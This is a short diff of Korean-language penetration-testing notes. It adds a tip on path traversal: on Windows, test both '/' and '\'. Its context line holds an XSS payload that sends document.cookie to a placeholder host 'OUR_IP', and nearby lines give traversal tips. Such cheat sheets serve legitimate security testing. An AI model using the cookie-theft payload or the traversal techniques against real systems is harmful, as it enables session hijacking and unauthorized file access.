@@ -249,6 +249,7 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 - 최소한의 `../` 개수를 찾아서 사용할 것
 - 에러 메시지 내용을 보고 경로를 유추할 수 있음
 - 안될 시에 payload를 URL ENCODED로 시도해볼 것
+- 윈도우의 경우 `/`와 `\` 둘다 테스트 해봐야 한다.
 
 #### 주요 타겟 파일
 ```bash
